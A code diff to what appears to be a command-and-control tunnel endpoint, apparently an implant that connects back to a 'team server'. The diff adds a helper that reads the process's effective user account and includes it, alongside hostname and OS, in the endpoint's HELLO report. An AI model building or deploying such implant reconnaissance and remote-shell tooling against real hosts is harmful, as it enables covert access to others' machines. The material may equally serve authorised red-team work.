@@ -3311,6 +3311,29 @@ class _TunnelChannel(object):
         _shut_socket(self.sock)
 
 
+def _process_user() -> Optional[str]:
+    """The account a shell session spawned here would run as, or None.
+
+    The panel warns an operator about the rights a session carries, and
+    those are this process's: root when the endpoint came up from the
+    service unit, some unprivileged account when a generated build was
+    started by hand. Nothing on the team server can work that out, so the
+    endpoint reports it the way it reports its own hostname.
+
+    The effective uid rather than the real one, because that is the one a
+    session spawned here would run with. `None` on any failure -- a HELLO
+    that cannot be built costs the whole tunnel, and a missing name only
+    costs the panel a sentence it already has a wording for.
+    """
+    try:
+        if platform.system() != "Windows":
+            import pwd
+            return pwd.getpwuid(os.geteuid()).pw_name
+        return os.environ.get("USERNAME") or None
+    except Exception:
+        return None
+
+
 class TunnelEndpoint(object):
     """The far end of the tunnel: one command channel, one relay per request.
 
@@ -3599,6 +3622,7 @@ class TunnelEndpoint(object):
         body = {"identity": self.identity,
                 "hostname": platform.node(),
                 "os": "%s %s" % (platform.system(), platform.release()),
+                "user": _process_user(),
                 "crypto": self._crypto_path(),
                 "features": list(TUNNEL_FEATURES)}
         if self.implant_id:
